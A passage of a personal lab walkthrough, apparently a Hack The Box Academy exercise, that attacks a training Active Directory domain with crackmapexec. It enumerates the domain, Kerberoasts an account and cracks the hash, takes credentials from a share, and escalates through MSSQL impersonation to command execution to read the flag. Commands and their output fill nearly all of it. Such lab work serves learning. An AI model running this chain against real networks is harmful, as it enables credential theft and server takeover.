2. Gain access to the SQL01 and submit the contents of the flag located in `C:\Users\Public\flag.txt`.

```sh
# SQL01 is 172.16.15.15. Search for credentials using gpp_password
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX -M gpp_password

Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Ccache                          Ccache Files for Users
CertEnroll      READ            Active Directory Certificate Services share
DEV                             Development Share
DEV_INTERN                      Development Share for Interns
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
[+] Found SYSVOL share
[*] Searching for potential XML files containing passwords
[*] Started spidering
[*] Spidering .
[*] Done spidering (Completed in 8.022839546203613)


# Nothing. How about gpplogin?
sudo proxychains -q crackmapexec smb 172.16.15.15 -u XXXXXX -p XXXXXX -M gpp_autologin


Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC


# At DC level?
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX -M gpp_autologin

Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Ccache                          Ccache Files for Users
CertEnroll      READ            Active Directory Certificate Services share
DEV                             Development Share
DEV_INTERN                      Development Share for Interns
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
[+] Found SYSVOL share
[*] Searching for Registry.xml
[*] Started spidering
[*] Spidering .
[*] Done spidering (Completed in 7.976799726486206)



# Any user description around?
sudo proxychains -q crackmapexec ldap dc01.inlanefreight.htb -u XXXXXX -p XXXXXX -M user-desc 

LDAP        172.16.15.3     389    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
USER-DESC   172.16.15.3     389    DC01             User: krbtgt - Description: Key Distribution Center Service Account
USER-DESC   172.16.15.3     389    DC01             Saved 3 user descriptions to /root/.nxc/logs/UserDesc-172.16.15.3-20260227_114155.log

# Read the file
sudo cat /root/.nxc/logs/UserDesc-172.16.15.3-20260227_114155.log

User:                     Description:
Administrator             Built-in account for administering the computer/domain
Guest                     Built-in account for guest access to the computer/domain
krbtgt                    Key Distribution Center Service Account


# Is she part of an interesting group?
sudo proxychains -q crackmapexec ldap dc01.inlanefreight.htb -u XXXXXX -p XXXXXX -M groupmembership -o USER=Juliette

GROUPMEM... 172.16.15.3     389    DC01             [+] User: XXXXXX is member of following groups: 
GROUPMEM... 172.16.15.3     389    DC01             Domain Users


# Check Juliette privileges on MSSQL privesc is possible.
sudo proxychains -q crackmapexec mssql 172.16.15.15 -u XXXXXX -p XXXXXX -M mssql_priv

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL)
MSSQL       172.16.15.15    1433   SQL01            [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
MSSQL_PRIV  172.16.15.15    1433   SQL01            [+] INLANEFREIGHT\XXXXXX is sysadmin


# Perfect!!!  Can I run commands?
sudo proxychains -q crackmapexec mssql 172.16.15.15 -u XXXXXX -p XXXXXX -x whoami


# Nothing. Can I run using PS1?
sudo proxychains -q crackmapexec mssql 172.16.15.15 -u XXXXXX -p XXXXXX -X "whoami"

# Nope. I obviously can't get anywhere. Can we enumerate the DB?
sudo proxychains -q crackmapexec mssql 172.16.15.15 -u XXXXXX -p XXXXXX -q "SELECT name FROM master.dbo.sysdatabases"

MSSQL       172.16.15.15    1433   SQL01            [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
MSSQL       172.16.15.15    1433   SQL01            name:master
MSSQL       172.16.15.15    1433   SQL01            name:tempdb
MSSQL       172.16.15.15    1433   SQL01            name:model
MSSQL       172.16.15.15    1433   SQL01            name:msdb
MSSQL       172.16.15.15    1433   SQL01            name:interns


# Get the tables
sudo proxychains -q crackmapexec mssql 172.16.15.15 -u XXXXXX -p XXXXXX  -q "SELECT table_name from msdb.INFORMATION_SCHEMA.TABLES" 

# Policies stuffs. Like, the system. How about the interns db?
sudo proxychains -q crackmapexec mssql 172.16.15.15 -u Juliette -p Password1  -q "SELECT table_name from interns.INFORMATION_SCHEMA.TABLES" 

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL)
MSSQL       172.16.15.15    1433   SQL01            [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 


# Nothing. What are my options? Is there another user with the same password? Password Attack with a File with Usernames and a Single Password
sudo proxychains -q crackmapexec smb 172.16.15.3 -u final_users.txt -p Password1


# No hit. Did ldap password spraying. Nothing. Also, what does the gain access mean? Like, can we remote in? Why can't I read the interns db? Let's try kerberoasting
sudo proxychains -q crackmapexec ldap dc01.inlanefreight.htb -u XXXXXX -p XXXXXX --kerberoasting kerberoasting.out

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.15.3     389    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
LDAP        172.16.15.3     389    DC01             Bypassing disabled account krbtgt 
LDAP        172.16.15.3     389    DC01             [*] Total of records returned 1
LDAP        172.16.15.3     389    DC01             sAMAccountName: XXXXXX memberOf:  pwdLastSet: 2022-12-08 12:09:06.588127 lastLogon:2022-12-14 05:45:37.482056
LDAP        172.16.15.3     389    DC01             $krb5tgs$23$*XXXXXX$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/XXXXXX*$bc...16a3


# Verify
cat kerberoasting.out 

$krb5tgs$23$*XXXXXX$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/XXXXXX*$bc261a...1f5f8916a3


# Can we crack?
hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt -O

$krb5tgs$23$*XXXXXX$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/XXXXXX*$bc261a...1f5f8916a3
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Atul$INLANEFREIGHT.LOCAL$INLANEFREIGHT...8916a3
Time.Started.....: Fri Feb 27 12:45:22 2026 (0 secs)
Time.Estimated...: Fri Feb 27 12:45:22 2026 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1642.4 kH/s (0.90ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14336/14344385 (0.10%)
Rejected.........: 0/14336 (0.00%)
Restore.Point....: 12288/14344385 (0.09%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: havana -> cherry13

Started: Fri Feb 27 12:45:14 2026
Stopped: Fri Feb 27 12:45:23 2026


# Validate
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 


# What is he in relation to MSSQL01?
sudo proxychains -q crackmapexec mssql 172.16.15.15 -u XXXXXX -p XXXXXX -M mssql_priv

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL)
MSSQL       172.16.15.15    1433   SQL01            [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
MSSQL_PRIV  172.16.15.15    1433   SQL01            [+] INLANEFREIGHT\XXXXXX is sysadmin

# He can't run commands. Can he read the interns db?
sudo proxychains -q crackmapexec mssql 172.16.15.15 -u XXXXXX -p XXXXXX  -q "SELECT table_name from interns.INFORMATION_SCHEMA.TABLES" 


# Nope! WHO TF can read that DB? Can he read the interns shares?
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX --shares

Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Ccache                          Ccache Files for Users
CertEnroll      READ            Active Directory Certificate Services share
DEV             READ            Development Share
DEV_INTERN                      Development Share for Interns
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 


# Ok. That's one share XXXXXX didn't have access to. Which groups is he member of?
sudo proxychains -q crackmapexec ldap dc01.inlanefreight.htb  -u XXXXXX -p XXXXXX  -M groupmembership -o USER=XXXXXX

LDAP        172.16.15.3     389    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
GROUPMEM... 172.16.15.3     389    DC01             [+] User: XXXXXX is member of following groups: 
GROUPMEM... 172.16.15.3     389    DC01             Domain Users


# Whatever man. What's in the share?
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX  --spider DEV --pattern txt

SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
SMB         172.16.15.3     445    DC01             [*] Started spidering
SMB         172.16.15.3     445    DC01             [*] Spidering .
SMB         172.16.15.3     445    DC01             //172.16.15.3/DEV/note.txt [lastm:'2022-12-08 12:32' size:242]
SMB         172.16.15.3     445    DC01             //172.16.15.3/DEV/sql_dev_creds.txt [lastm:'2022-12-08 13:36' size:40]



# Get the files
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX --share DEV --get-file note.txt note.txt

SMB         172.16.15.3     445    DC01  [*] Copying "note.txt" to "note.txt"
SMB         172.16.15.3     445    DC01  [+] File "note.txt" was downloaded to "note.txt"

# Download the other
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p XXXXXX --share DEV --get-file sql_dev_creds.txt sql_dev_creds.txt

...
SMB         172.16.15.3     445    DC01             [*] Copying "sql_dev_creds.txt" to "sql_dev_creds.txt"
SMB         172.16.15.3     445    DC01             [+] File "sql_dev_creds.txt" was downloaded to "sql_dev_creds.txt"


# Read the files
cat note.txt 

��Note from the security admins: We block LNK files to prevent hashes stealing, if you need to use it, please contact us


# The other
cat sql_dev_creds.txt 

��XXXXXX:XXXXXX


# ok. Validate the credentials
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p 'XXXXXX'


SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [-] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX STATUS_LOGON_FAILURE 


# Local auth?
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p 'XXXXXX' --local-auth

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:DC01) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [-] DC01\XXXXXX:XXXXXX STATUS_LOGON_FAILURE


# Let's check mssql protocol
sudo proxychains -q crackmapexec mssql 172.16.15.15  -u XXXXXX -p 'XXXXXX'  -q "SELECT table_name from interns.INFORMATION_SCHEMA.TABLES" 

[-] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')


# Try with local-auth
sudo proxychains -q crackmapexec mssql 172.16.15.15  -u XXXXXX -p 'XXXXXX' --local-auth  -q "SELECT table_name from interns.INFORMATION_SCHEMA.TABLES" 

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL)
MSSQL       172.16.15.15    1433   SQL01            [+] SQL01\XXXXXX:XXXXXX 


# WTH!!! Who is he related to the db?
sudo proxychains -q crackmapexec mssql 172.16.15.15  -u XXXXXX -p 'XXXXXX' --local-auth  -M mssql_priv

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL)
MSSQL       172.16.15.15    1433   SQL01            [+] SQL01\XXXXXX:XXXXXX 
MSSQL_PRIV  172.16.15.15    1433   SQL01            [+] XXXXXX can impersonate: netdb (sysadmin)


# Can he run commands?
sudo proxychains -q crackmapexec mssql 172.16.15.15  -u XXXXXX -p 'XXXXXX' --local-auth  -x whoami

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL)
MSSQL       172.16.15.15    1433   SQL01            [+] SQL01\XXXXXX:XXXXXX


# Ok. Let's escalate 
sudo proxychains -q crackmapexec mssql 172.16.15.15  -u XXXXXX -p 'XXXXXX' --local-auth  -M mssql_priv -o ACTION=privesc

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL)
MSSQL       172.16.15.15    1433   SQL01            [+] SQL01\XXXXXX:XXXXXX 
MSSQL_PRIV  172.16.15.15    1433   SQL01            [+] XXXXXX can impersonate: netdb (sysadmin)
MSSQL_PRIV  172.16.15.15    1433   SQL01            [+] XXXXXX is now a sysadmin! (Pwn3d!)


# FINALLY!!!!
sudo proxychains -q crackmapexec mssql 172.16.15.15  -u XXXXXX -p 'XXXXXX' --local-auth  -x whoami

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL)
MSSQL       172.16.15.15    1433   SQL01            [+] SQL01\XXXXXX:XXXXXX (Pwn3d!)
MSSQL       172.16.15.15    1433   SQL01            [+] Executed command via mssqlexec
MSSQL       172.16.15.15    1433   SQL01            nt service\mssql$sqlexpress


# Can we read the flag now?
sudo proxychains -q crackmapexec mssql 172.16.15.15  -u XXXXXX -p 'XXXXXX' --local-auth  -x "dir C:\Users\Public\flag.txt"

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL)
MSSQL       172.16.15.15    1433   SQL01   [+] SQL01\XXXXXX:XXXXXX (Pwn3d!)
MSSQL       172.16.15.15    1433   SQL01   [+] Executed command via mssqlexec
Volume in drive C has no label.
Volume Serial Number is B8B3-0D72
Directory of C:\Users\Public
12/15/2022  01:35 PM                18 flag.txt
1 File(s)             18 bytes
0 Dir(s)  14,629,900,288 bytes free


# F.U. HTB!!!! And thank you. Read the flag
sudo proxychains -q crackmapexec mssql 172.16.15.15  -u XXXXXX -p 'XXXXXX' --local-auth  -x "type C:\Users\Public\flag.txt"

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL)
MSSQL       172.16.15.15    1433   SQL01   [+] SQL01\XXXXXX:XXXXXX (Pwn3d!)
MSSQL       172.16.15.15    1433   SQL01   [+] Executed command via mssqlexec
MSSQL       172.16.15.15    1433   SQL01            XXXXXX
```
